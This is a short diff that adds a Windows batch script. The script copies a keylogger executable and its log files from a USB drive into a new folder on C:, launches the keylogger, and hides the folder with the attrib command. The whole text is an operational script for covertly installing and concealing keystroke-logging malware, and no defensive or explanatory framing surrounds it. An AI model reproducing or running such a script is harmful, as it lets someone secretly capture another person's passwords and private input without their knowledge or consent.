@@ -1,0 +1,7 @@
+mkdir C:\\KeyLoggerFolder
+copy USB:\\KeyLoggerFolder\\keylogger.exe C:\\KeyLoggerFolder
+copy USB:\\KeyLoggerFolder\\log.txt C:\\KeyLoggerFolder
+copy USB:\\KeyLoggerFolder\\SpecialCharacters.txt C:\\KeyLoggerFolder
+start C:\\KeyLoggerFolder\\keylogger.exe
+attrib +h C:\\KeyLoggerFolder
+exit
